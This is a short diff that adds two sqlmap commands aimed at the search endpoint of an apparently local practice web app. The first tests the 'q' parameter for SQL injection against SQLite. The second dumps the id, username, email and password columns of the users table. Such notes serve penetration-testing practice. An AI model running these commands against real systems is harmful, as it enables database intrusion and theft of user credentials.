@@ -1,0 +1,2 @@
+python sqlmap.py -u "http://192.168.99.100:32772/rest/product/search?q=apple" -p q --level=3 --risk=1 --dbms sqlite --flush-session
+python sqlmap.py -u "http://192.168.99.100:32772/rest/product/search?q=apple" -p q --level=3 --risk=1 --dump --no-cast --no-escape -T users -C "id,username,email,password"
